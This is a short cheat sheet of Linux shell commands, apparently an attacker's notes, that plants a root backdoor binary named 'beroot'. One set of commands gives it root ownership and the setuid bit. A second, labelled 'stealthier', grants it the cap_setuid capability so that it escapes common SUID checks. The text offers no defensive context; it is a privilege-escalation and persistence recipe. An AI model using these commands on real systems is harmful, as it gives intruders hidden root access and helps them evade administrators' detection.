SUID
====
chown root: beroot
chmod go+rx beroot
chmod u+s beroot

CAPABILITY (stealthier)
=======================
setcap cap_setuid=ep beroot
